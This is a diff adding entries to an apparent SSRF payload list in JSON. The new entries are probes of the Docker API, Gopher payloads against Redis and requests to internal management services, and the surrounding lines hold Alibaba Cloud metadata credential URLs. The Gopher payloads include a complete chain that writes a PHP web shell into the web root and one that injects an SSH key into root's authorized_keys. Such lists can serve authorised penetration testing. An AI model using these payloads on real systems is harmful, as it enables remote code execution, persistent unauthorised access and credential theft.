@@ -119,6 +119,38 @@
         {"payload": "http://100.100.100.200/latest/meta-data/ram/security-credentials/", "description": "Alibaba Cloud RAM role credentials — equivalent to AWS IAM role credentials", "waf_bypass": false},
         {"payload": "http://100.100.100.200/latest/user-data", "description": "Alibaba Cloud user-data — initialization scripts that may contain secrets", "waf_bypass": false}
       ]
+    },
+    "docker": {
+      "description": "SSRF payloads targeting Docker API and container runtime",
+      "payloads": [
+        {"payload": "http://127.0.0.1:2375/containers/json", "description": "Docker API — list running containers (unauthenticated remote API)", "waf_bypass": false},
+        {"payload": "http://127.0.0.1:2375/images/json", "description": "Docker API — list available images", "waf_bypass": false},
+        {"payload": "http://127.0.0.1:2375/info", "description": "Docker API — system info including OS, kernel, registry config", "waf_bypass": false},
+        {"payload": "http://127.0.0.1:2375/version", "description": "Docker API — version info for targeted exploitation", "waf_bypass": false},
+        {"payload": "http://host.docker.internal:8080/", "description": "Docker Desktop host access — reaches services on Docker host machine", "waf_bypass": false}
+      ]
+    },
+    "gopher_redis": {
+      "description": "SSRF payloads targeting Redis via Gopher protocol — chain for RCE by writing web shells",
+      "payloads": [
+        {"payload": "gopher://127.0.0.1:6379/_INFO%0d%0aQUIT%0d%0a", "description": "Redis info probe via Gopher — confirms Redis is reachable", "waf_bypass": false},
+        {"payload": "gopher://127.0.0.1:6379/_CONFIG%20GET%20dir%0d%0aCONFIG%20GET%20dbfilename%0d%0aQUIT%0d%0a", "description": "Redis config enumeration — get current dump directory and filename", "waf_bypass": false},
+        {"payload": "gopher://127.0.0.1:6379/_FLUSHALL%0d%0aCONFIG%20SET%20dir%20/var/www/html/%0d%0aCONFIG%20SET%20dbfilename%20shell.php%0d%0aSET%20x%20%22%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%3F%3E%22%0d%0aSAVE%0d%0aQUIT%0d%0a", "description": "Redis RCE — write PHP web shell via CONFIG SET dir + dbfilename + SAVE", "waf_bypass": false},
+        {"payload": "gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/root/.ssh/%0d%0aCONFIG%20SET%20dbfilename%20authorized_keys%0d%0aSET%20x%20%22ssh-rsa%20AAAA...%22%0d%0aSAVE%0d%0aQUIT%0d%0a", "description": "Redis SSH key injection — write authorized_keys for SSH access (replace key)", "waf_bypass": false}
+      ]
+    },
+    "internal_services": {
+      "description": "SSRF payloads targeting common internal services and management interfaces",
+      "payloads": [
+        {"payload": "http://127.0.0.1:9200/_cat/indices", "description": "Elasticsearch — list all indices (often unauthenticated internally)", "waf_bypass": false},
+        {"payload": "http://127.0.0.1:5601/api/status", "description": "Kibana — dashboard status and version info", "waf_bypass": false},
+        {"payload": "http://127.0.0.1:8500/v1/agent/members", "description": "Consul — list cluster members and service discovery", "waf_bypass": false},
+        {"payload": "http://127.0.0.1:8080/manager/html", "description": "Tomcat Manager — if default credentials or no auth on internal", "waf_bypass": false},
+        {"payload": "http://127.0.0.1:15672/api/overview", "description": "RabbitMQ management API — queue stats and credential exposure", "waf_bypass": false},
+        {"payload": "http://127.0.0.1:6379", "description": "Redis — direct TCP connection attempt (check for unauthenticated access)", "waf_bypass": false},
+        {"payload": "http://127.0.0.1:27017/", "description": "MongoDB — direct connection attempt (older versions expose HTTP interface)", "waf_bypass": false},
+        {"payload": "http://127.0.0.1:11211/stats", "description": "Memcached — stats command to confirm access and get cache info", "waf_bypass": false}
+      ]
     }
   }
 }
